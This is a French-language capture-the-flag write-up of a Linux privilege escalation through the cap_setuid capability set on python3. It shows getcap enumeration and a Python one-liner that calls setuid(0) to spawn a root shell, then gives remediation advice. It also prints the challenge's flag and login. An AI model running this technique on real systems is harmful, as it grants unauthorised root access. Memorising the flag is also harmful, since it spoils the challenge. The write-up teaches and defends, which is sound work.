# Writeup — Linux Capabilities

**Catégorie** : Linux / Privilege Escalation  
**Difficulté** : Hard  
**Points** : 400  
**Flag** : `CTF{linux_capabilities_cap_setuid}`

## Contexte

Les Linux capabilities sont un mécanisme qui permet de diviser les privilèges root en unités distinctes. Plutôt que d'accorder tous les droits root à un processus, on peut lui attribuer uniquement la capability dont il a besoin. Cependant, certaines capabilities, comme `cap_setuid`, sont aussi dangereuses que le SUID bit complet car elles permettent de changer l'UID du processus en 0 (root). Ce challenge ne présente aucun binaire SUID évident, ce qui oblige à explorer une surface d'attaque moins connue.

## Connexion

```bash
ssh player@<TARGET_IP> -p 5024
# password: player2026
```

## Étapes de résolution

### 1. Énumération initiale

On commence par les vérifications habituelles qui ne donnent rien :

```bash
player@container:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
# Aucun binaire SUID inhabituel
```

```bash
player@container:~$ sudo -l
Sorry, user player may not run sudo on container.
# Pas de sudo
```

On élargit l'énumération aux Linux capabilities :

```bash
player@container:~$ getcap -r / 2>/dev/null
```

Sortie attendue :

```
/usr/bin/python3.10 = cap_setuid+ep
```

`cap_setuid+ep` signifie :
- `cap_setuid` : la capability de changer l'UID
- `+e` : effective (active dès le lancement du binaire)
- `+p` : permitted (la capability peut être utilisée)

### 2. Identification de la vulnérabilité

`cap_setuid` permet à un processus d'appeler `setuid()` pour se transformer en n'importe quel utilisateur, y compris root (UID 0). Cette capability accordée à python3 permet d'écrire un one-liner Python pour élever les privilèges.

Vérification :

```bash
player@container:~$ ls -la /usr/bin/python3.10
-rwxr-xr-x 1 root root 5904904 Jan  1 00:00 /usr/bin/python3.10

player@container:~$ getcap /usr/bin/python3.10
/usr/bin/python3.10 = cap_setuid+ep
```

Pas de SUID bit (`r-xr-xr-x`), mais la capability est là.

### 3. Exploitation

Avec `cap_setuid` sur python3, on peut appeler `os.setuid(0)` pour devenir root, puis lancer un shell :

```bash
player@container:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Explication du code :
- `import os` : importe le module de fonctions système
- `os.setuid(0)` : change l'UID du processus courant à 0 (root) — possible grâce à `cap_setuid`
- `os.system("/bin/bash")` : lance bash avec les nouveaux privilèges root

Sortie attendue :

```
root@container:~#
```

Vérification :

```bash
root@container:~# whoami
root
root@container:~# id
uid=0(root) gid=1000(player) groups=1000(player)
```

Note : l'uid est 0 (root) mais le gid reste celui de player — pour un accès complet, on peut aussi appeler `os.setgid(0)` :

```bash
player@container:~$ python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
root@container:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### 4. Récupération du flag

```bash
root@container:~# cat /root/flag.txt
CTF{linux_capabilities_cap_setuid}
```

## Explication de la vulnérabilité

Les Linux capabilities ont été conçues pour réduire la surface d'attaque en évitant d'accorder le bit SUID complet. Cependant, `cap_setuid` est une capability "dangereuse" car elle donne le pouvoir de changer d'UID, ce qui revient à une escalade de privilèges complète vers root si l'on appelle `setuid(0)`.

Accorder `cap_setuid+ep` à un interpréteur comme python3 est particulièrement risqué car python peut exécuter du code arbitraire. La capability se transforme alors en vecteur d'élévation de privilèges pour n'importe quel utilisateur du système.

**Impact réel** : Accès root complet. Un attaquant disposant d'un accès utilisateur peut escalader vers root via un simple one-liner. Les capabilities sont souvent oubliées lors des audits de sécurité car moins visibles que le bit SUID.

## Recommandations de remédiation

1. **Auditer régulièrement les capabilities** :
   ```bash
   getcap -r / 2>/dev/null
   ```
2. **Retirer la capability de python3** :
   ```bash
   setcap -r /usr/bin/python3.10
   ```
3. **Éviter d'accorder `cap_setuid` à des interpréteurs** (python, perl, ruby, etc.).
4. **Utiliser des capabilities plus restrictives** si possible (ex: `cap_net_bind_service` pour écouter sur les ports < 1024 sans root).
5. **Documenter toutes les capabilities non-standard** et les justifier dans la politique de sécurité.
6. **Intégrer la vérification des capabilities** dans les outils de durcissement (Lynis, OpenSCAP).

## Références

- Linux capabilities man page : https://man7.org/linux/man-pages/man7/capabilities.7.html
- GTFOBins - capabilities : https://gtfobins.github.io/#+capabilities
- HackTricks - Linux Capabilities : https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
- MITRE ATT&CK T1548 (Abuse Elevation Control Mechanism) : https://attack.mitre.org/techniques/T1548/
- getcap(8) / setcap(8) man pages
